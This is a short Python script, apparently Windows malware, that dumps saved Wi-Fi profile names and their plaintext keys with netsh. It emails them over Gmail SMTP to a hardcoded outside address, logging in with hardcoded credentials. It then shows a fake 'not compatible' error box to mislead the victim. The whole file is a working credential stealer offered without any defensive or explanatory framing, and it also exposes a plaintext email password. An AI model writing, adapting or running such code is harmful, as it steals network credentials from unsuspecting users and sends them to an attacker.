import os
from tkinter import messagebox
import smtplib 
from email.mime.text import MIMEText




os.system('netsh wlan show profiles  > pro.txt')



lst=list()

hf = open('pro.txt')
for line in hf :
    if   "Tous" in line   :
        
        x = line.split()
        lst.append(x[5])

pst = list()
if len(lst)!=0:
    for a in lst :
        os.system('netsh wlan show profiles '+a+' key = clear > '+a+'pass.txt')
        hd = open(a+"pass.txt")
        for line in hd :
            if 'Contenu' in line :
                y=line.split()
                t=(a,y[5])
                pst.append(t)
                continue

          

email_message = ""


for n,k in pst:
    email_message += "ssid :" +n+"          password :"+k+"\n" 







sender ='ethical.mirage@gmail.com'
receiver = 'mirage.abdelle@gmail.com'
body= email_message

msg = MIMEText(body , 'html')
msg['Subject']= 'Python Email'
msg['From'] = sender
msg['To'] =','.join(receiver)




s=smtplib.SMTP_SSL(host= 'smtp.gmail.com', port = 465)
s.login(user=sender,password='kimo11.22')
s.sendmail(sender, receiver , msg.as_string())
s.quit()


  
messagebox.showinfo("Erorre","your computer is no compatibel")


